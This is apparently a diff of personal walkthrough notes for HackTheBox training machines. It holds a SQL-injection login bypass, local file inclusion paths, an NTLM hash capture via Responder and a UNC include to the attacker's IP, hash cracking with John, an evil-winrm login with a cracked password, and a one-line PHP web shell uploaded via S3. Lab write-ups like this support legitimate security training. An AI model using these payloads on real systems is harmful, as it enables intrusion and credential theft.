@@ -65,5 +65,60 @@ $password = ' OR 1=1 #
 `$sql="SELECT * FROM users WHERE username='admin' AND password='' OR 1=1 #'";`
 
 ### Sequel
+Mysql login broken / unable to login
 
+### Crocodile
+FTP Login
+`ftp anonymous@{target_IP}`
 
+FTP list / download
+`ls` / `get`
+
+### Responder
+Web Server IP Redirection to URL, but URL inaccessible
+echo "{target_IP} {target_URL}" >> /etc/hosts
+
+Local File Inclusion
+`http://unika.htb/index.php?page=FOOBAR`
+No such file or directory in C:\xampp\htdocs\index.php
+Access check at `http://unika.htb/index.php?page=../../../windows/system32/drivers/etc/hosts` successful
+Or `http://unika.htb/index.php?page=../../../documents and settings/administrator/desktop/desktop.ini`
+
+Using Responder to try and have webserver connect to us, proving NTLM Hash
+`responder -I {network_interface}`
+http://unika.htb/index.php?page=http://10.10.14.74
+Answer: Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in C:\xampp\htdocs\index.php on line 11
+Unable to include `http://` URLs
+
+Run Gobuster with LFI List in Fuzz mode, trying to see which directories / files we can access
+gobuster fuzz -w /usr/share/wordlists/seclists/Fuzzing/LFI/file_inclusion_windows.txt --url "http://unika.htb/index.php?page=" --exclude-length 0-700
+
+Back to Responder:
+Try to include File URL:
+http://unika.htb/index.php?page=//10.10.14.74/file
+Responder successfully captures Hash > hash.txt
+
+Offline Crack NTLM hash using John the Ripper
+John The Ripper available Hash Formats
+`john --list=formats`
+`john -w=/usr/share/wordlists/rockyou.txt --format=netntlmv2 ~/hash.txt`
+
+With found Password and WinRM running, connect to target and grab flag
+`evil-winrm -i 10.129.95.234 -u administrator -p badminton`
+
+### Three
+Subdomain Enumeration - DOES NOT WORK
+Domain was added to /etc/hosts, so any DNS queries to that domain won't resolve
+`gobuster dns --domain thetoppers.htb --wordlist /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt --threads 128`
+instead use GoBuster vhost mode
+`gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb/ --threads 128 --append-domain`
+
+Use AWS CLI to list S3 files using found S3 endpoint
+`aws --endpoint http://s3.thetoppers.htb s3 ls`
+
+Create PHP Reverse Shell and upload it to web server via S3
+`<?php system($_GET["cmd"]); ?>`
+More advanced Reverse Shell at
+https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/web/simple_php_web_shell_get_v2.php
+Or Interactive Reverse Shell at
+https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell-one-liner
